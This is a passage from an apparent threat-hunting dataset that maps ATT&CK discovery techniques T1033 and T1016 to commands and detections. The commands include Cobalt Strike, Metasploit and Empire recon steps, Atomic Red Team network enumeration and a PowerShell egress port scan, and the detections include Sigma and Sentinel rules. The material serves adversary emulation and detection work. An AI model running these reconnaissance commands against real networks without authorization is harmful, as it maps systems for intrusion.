"powershell/situational_awareness/network/bloodhound", "powershell/situational_awareness/network/bloodhound", "powershell/situational_awareness/network/powerview/get_session", "powershell/situational_awareness/network/powerview/get_session"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"whoami.exe\"or process_command_line contains \"whoami\"or file_directory contains \"useraccount get /ALL\"or process_path contains \"qwinsta.exe\"or process_path contains \"quser.exe\"or process_path contains \"systeminfo.exe\")", "name": "System Owner User Discovery"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: system owner / user found\ndescription: windows server 2016 / Ubuntu19.04\nreferences: https://attack.mitre.org/techniques/T1033/\ntags: T1033\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ windows \\ system32 \\ whoami.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: whoami # Process information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4703 # a user's privileges to be adjusted.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ whoami.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EnabledPrivileges: 'SeDebugPrivilege' permission enabled #\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ whoami.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Exitstatus: 0x0 # Process information> exit status\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: low\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: linux\n\u00a0\u00a0\u00a0\u00a0service: history\ndetection:\n\u00a0\u00a0\u00a0\u00a0keywords:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- w\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- who\n\u00a0\u00a0\u00a0\u00a0condition: keywords\nlevel: low", "name": "Yml"}], "possible_detections": [{"data_source": {"title": "System Owner or User Discovery", "id": "9a0d8ca0-2385-4020-b6c6-cb6153ca56f3", "status": "experimental", "description": "Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "author": "Timur Zinniatullin, oscd.community", "date": "2019/10/21", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.yaml"], "logsource": {"product": "linux", "service": "auditd"}, "detection": {"selection": {"type": "EXECVE", "a0": ["users", "w", "who"]}, "condition": "selection"}, "falsepositives": ["Admin activity"], "level": "low", "tags": ["attack.discovery", "attack.t1033"]}}, {"data_source": {"title": "Whoami Execution", "id": "e28a5a99-da44-436d-b7a0-2afc20a5f413", "status": "experimental", "description": "Detects the execution of whoami, which is often used by attackers after exloitation / privilege escalation but rarely used by administrators", "references": ["https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/", "https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/"], "author": "Florian Roth", "date": "2018/08/13", "tags": ["attack.discovery", "attack.t1033", "car.2016-03-001"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\whoami.exe"}, "selection2": {"OriginalFileName": "whoami.exe"}, "condition": "selection or selection2"}, "falsepositives": ["Admin activity", "Scripts and administrative tools used in the monitored environment"], "level": "high"}}]}, {"technique_id": "T1016", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "ipconfig /all", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell ipconfig", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "ipconfig\npost/windows/gather/enum_domains", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "arp -a\nroute print", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell arp -a", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "route", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "nbtstat -a {IP | COMP_NAME }", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell c:\\windows\\sysnative\\nbstat.exe -a {IP | COMP_NAME}", "name": "Cobalt Strike"}, {"source": "atomics/T1016/T1016.yaml", "command": "ipconfig /all\nnetsh interface show\narp -a\nnbtstat -n\nnet config\n", "name": null}, {"source": "atomics/T1016/T1016.yaml", "command": "netsh advfirewall firewall show rule name=all\n", "name": null}, {"source": "atomics/T1016/T1016.yaml", "command": "if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v netstat)\" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;\n", "name": null}, {"source": "atomics/T1016/T1016.yaml", "command": "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n", "name": null}, {"source": "atomics/T1016/T1016.yaml", "command": "$ports = Get-content PathToAtomicsFolder\\T1016\\src\\top-128.txt\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "name": null}, {"source": "atomics/T1016/T1016.yaml", "command": "$ports = Get-content #{port_file}\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "name": null}, {"source": "atomics/T1016/T1016.yaml", "command": "$ports = Get-content #{port_file}\n$file = \"$env:USERPROFILE\\Desktop\\open-ports.txt\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "name": null}, {"source": "data/abilities/discovery/14a21534-350f-4d83-9dd7-3c56b93a0c17.yml", "command": {"windows": {"psh": {"command": "nbtstat -n\n", "parsers": {"plugins.stockpile.app.parsers.nbtstat": [{"source": "network.domain.name"}]}}}}, "name": "Find Domain information"}, {"source": "data/abilities/discovery/9a30740d-3aa8-4c23-8efa-d51215e8a5b9.yml", "command": {"darwin": {"sh": {"command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"]}}, "linux": {"sh": {"command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"]}}, "windows": {"psh": {"command": ".\\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan\n", "payloads": ["28f9bf43-4f14-4965-9bd9-b70fd6993d8e"]}}}, "name": "View all potential WIFI networks on host"}, {"source": "data/abilities/discovery/a0676fe1-cd52-482e-8dde-349b73f9aa69.yml", "command": {"darwin": {"sh": {"command": "./wifi.sh pref\n", "payloads": ["wifi.sh"]}}, "linux": {"sh": {"command": "./wifi.sh pref\n", "payloads": ["wifi.sh"]}}, "windows": {"psh": {"command": ".\\wifi.ps1 -Pref\n", "payloads": ["wifi.ps1"]}}}, "name": "See the most used WIFI networks of a machine"}, {"source": "data/abilities/discovery/ac9dce33-2acc-4b34-94ce-2596409ce8f0.yml", "command": {"darwin": {"sh": {"command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done\n"}}}, "name": "Ping the network in order to build the ARP cache"}, {"source": "data/abilities/discovery/b6f545ef-f802-4537-b59d-2cb19831c8ed.yml", "command": {"darwin": {"sh": {"command": "ifconfig | grep broadcast"}}}, "name": "Capture the local network broadcast IP address"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/dnsserver", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/dnsserver", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/get_proxy", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/host/get_proxy", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/arpscan", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/arpscan", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_subnet", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_subnet", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1016", "Built-in Windows Command": "ipconfig /all", "Cobalt Strike": "shell ipconfig", "Metasploit": "ipconfig\npost/windows/gather/enum_domains", "Description": "Get information about the domain, network adapters, DNS / WSUS servers"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1016", "Built-in Windows Command": "arp -a\nroute print", "Cobalt Strike": "shell arp -a", "Metasploit": "route", "Description": "Display the ARP table"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1016", "Built-in Windows Command": "nbtstat -a {IP | COMP_NAME }", "Cobalt Strike": "shell c:\\windows\\sysnative\\nbstat.exe -a {IP | COMP_NAME}", "Metasploit": "", "Description": "Used to get the MAC and IP addresses as well as some descriptive codes for machines (0x1C indicates a domain controller)"}}, {"Atomic Red Team Test - System Network Configuration Discovery": {"attack_technique": "T1016", "display_name": "System Network Configuration Discovery", "atomic_tests": [{"name": "System Network Configuration Discovery on Windows", "description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "ipconfig /all\nnetsh interface show\narp -a\nnbtstat -n\nnet config\n"}}, {"name": "List Windows Firewall Rules", "description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "netsh advfirewall firewall show rule name=all\n"}}, {"name": "System Network Configuration Discovery", "description": "Identify network configuration information.\n\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "sh", "elevation_required": false, "command": "if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v netstat)\" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;\n"}}, {"name": "System Network Configuration Discovery (TrickBot Style)", "description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n\nUpon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n"}}, {"name": "List Open Egress Ports", "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n", "supported_platforms": ["windows"], "input_arguments": {"port_file": {"description": "The path to a text file containing ports to be scanned, one port per line. The default list uses the top 128 ports as defined by Nmap.", "type": "Path", "default": "PathToAtomicsFolder\\T1016\\src\\top-128.txt"}, "portfile_url": {"description": "URL to top-128.txt", "type": "Url", "default": "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt"}, "output_file": {"description": "Path of file to write port scan results", "type": "Path", "default": "$env:USERPROFILE\\Desktop\\open-ports.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Test requires #{port_file} to exist\n", "prereq_command": "if (Test-Path \"#{port_file}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{port_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"#{portfile_url}\" -OutFile \"#{port_file}\"\n"}], "executor": {"name": "powershell", "elevation_required": false, "command": "$ports = Get-content #{port_file}\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "cleanup_command": "Remove-Item -ErrorAction ignore \"#{output_file}\"\n"}}]}}, {"Mitre Stockpile - Find Domain information": {"id": "14a21534-350f-4d83-9dd7-3c56b93a0c17", "name": "Find Domain", "description": "Find Domain information", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "platforms": {"windows": {"psh": {"command": "nbtstat -n\n", "parsers": {"plugins.stockpile.app.parsers.nbtstat": [{"source": "network.domain.name"}]}}}}}}, {"Mitre Stockpile - View all potential WIFI networks on host": {"id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9", "name": "Scan WIFI networks", "description": "View all potential WIFI networks on host", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "platforms": {"darwin": {"sh": {"command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"]}}, "linux": {"sh": {"command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"]}}, "windows": {"psh": {"command": ".\\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan\n", "payloads": ["28f9bf43-4f14-4965-9bd9-b70fd6993d8e"]}}}}}, {"Mitre Stockpile - See the most used WIFI networks of a machine": {"id": "a0676fe1-cd52-482e-8dde-349b73f9aa69", "name": "Preferred WIFI", "description": "See the most used WIFI networks of a machine", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "platforms": {"darwin": {"sh": {"command": "./wifi.sh pref\n", "payloads": ["wifi.sh"]}}, "linux": {"sh": {"command": "./wifi.sh pref\n", "payloads": ["wifi.sh"]}}, "windows": {"psh": {"command": ".\\wifi.ps1 -Pref\n", "payloads": ["wifi.ps1"]}}}}}, {"Mitre Stockpile - Ping the network in order to build the ARP cache": {"id": "ac9dce33-2acc-4b34-94ce-2596409ce8f0", "name": "Ping network", "description": "Ping the network in order to build the ARP cache", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "platforms": {"darwin": {"sh": {"command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done\n"}}}}}, {"Mitre Stockpile - Capture the local network broadcast IP address": {"id": "b6f545ef-f802-4537-b59d-2cb19831c8ed", "name": "Snag broadcast IP", "description": "Capture the local network broadcast IP address", "tactic": "discovery", "technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "platforms": {"darwin": {"sh": {"command": "ifconfig | grep broadcast"}}}}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/host/dnsserver", "ATT&CK Technique #1": "T1016", "ATT&CK Technique #2": "", "Technique": "System Network Configuration Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/dnsserver\":  [\"T1016\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/host/get_proxy", "ATT&CK Technique #1": "T1016", "ATT&CK Technique #2": "", "Technique": "System Network Configuration Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/host/get_proxy\":  [\"T1016\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/arpscan", "ATT&CK Technique #1": "T1016", "ATT&CK Technique #2": "", "Technique": "System Network Configuration Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/arpscan\":  [\"T1016\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_subnet", "ATT&CK Technique #1": "T1016", "ATT&CK Technique #2": "", "Technique": "System Network Configuration Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_subnet\":  [\"T1016\"],"}}], "command_list": ["ipconfig /all", "shell ipconfig", "ipconfig\npost/windows/gather/enum_domains", "arp -a\nroute print", "shell arp -a", "route", "nbtstat -a {IP | COMP_NAME }", "shell c:\\windows\\sysnative\\nbstat.exe -a {IP | COMP_NAME}", "ipconfig /all\nnetsh interface show\narp -a\nnbtstat -n\nnet config\n", "netsh advfirewall firewall show rule name=all\n", "if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v netstat)\" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;\n", "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n", "$ports = Get-content PathToAtomicsFolder\\T1016\\src\\top-128.txt\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "$ports = Get-content #{port_file}\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "$ports = Get-content #{port_file}\n$file = \"$env:USERPROFILE\\Desktop\\open-ports.txt\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", {"windows": {"psh": {"command": "nbtstat -n\n", "parsers": {"plugins.stockpile.app.parsers.nbtstat": [{"source": "network.domain.name"}]}}}}, {"darwin": {"sh": {"command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"]}}, "linux": {"sh": {"command": "./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan\n", "payloads": ["9f639067-370a-40ba-b7ac-6f1c15d5a158"]}}, "windows": {"psh": {"command": ".\\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan\n", "payloads": ["28f9bf43-4f14-4965-9bd9-b70fd6993d8e"]}}}, {"darwin": {"sh": {"command": "./wifi.sh pref\n", "payloads": ["wifi.sh"]}}, "linux": {"sh": {"command": "./wifi.sh pref\n", "payloads": ["wifi.sh"]}}, "windows": {"psh": {"command": ".\\wifi.ps1 -Pref\n", "payloads": ["wifi.ps1"]}}}, {"darwin": {"sh": {"command": "for ip in $(seq 190 199); do ping -c 1 $(echo #{domain.broadcast.ip} |\ncut -d. -f-3).$ip -W 1; done\n"}}}, {"darwin": {"sh": {"command": "ifconfig | grep broadcast"}}}, "powershell/situational_awareness/host/dnsserver", "powershell/situational_awareness/host/dnsserver", "powershell/situational_awareness/host/get_proxy", "powershell/situational_awareness/host/get_proxy", "powershell/situational_awareness/network/arpscan", "powershell/situational_awareness/network/arpscan", "powershell/situational_awareness/network/powerview/get_subnet", "powershell/situational_awareness/network/powerview/get_subnet"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_command_line contains \"net.exe\"and file_directory contains \"config\")or (process_command_line contains \"ipconfig.exe\"or process_command_line contains \"netsh.exe\"or process_command_line contains \"arp.exe\"or process_command_line contains \"nbtstat.exe\")", "name": "System Network Configuration Discovery"}, {"product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "query": "Yml\ntitle: windows system network configuration discovery\ndescription: windows server 2016\nreferences:\ntags: T1016\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ ARP.EXE' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: arp * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ ipconfig.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: ipconfig * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ nbtstat.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: nbtstat * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ ROUTE.EXE' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: route * # Process Information> process command 